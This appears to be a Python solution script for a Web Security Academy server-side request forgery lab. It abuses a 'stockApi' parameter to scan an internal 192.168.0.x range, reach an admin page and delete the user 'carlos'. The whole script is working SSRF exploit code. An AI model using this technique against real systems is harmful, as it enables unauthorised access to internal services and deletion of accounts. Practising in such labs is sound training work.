import requests

url = "https://0af000cc04691274805844bf003f0013.web-security-academy.net/product/stock"

"""
for i in range(1, 256):
    data = {
        "stockApi" : f"http://192.168.0.{i}:8080"
    }

    response = requests.post(url, data)

    if(not b"Error" in response.content):
        print(f"http://192.168.0.{i}:8080 ==> {response.content}")
"""
# Result for .38 gave back "Not Found", which means the host is up


"""
admin_ip = "http://192.168.0.38:8080"

data = {
    "stockApi" : f"{admin_ip}/admin/"
}

response = requests.post(url, data)

print(response.content)
"""
#After retrieving the admin page, we get the deletion endpoint

delete_endpoint = "http://192.168.0.38:8080/admin/delete?username=carlos"

data = {
    "stockApi" : delete_endpoint
}

response = requests.post(url, data)

print(response.content)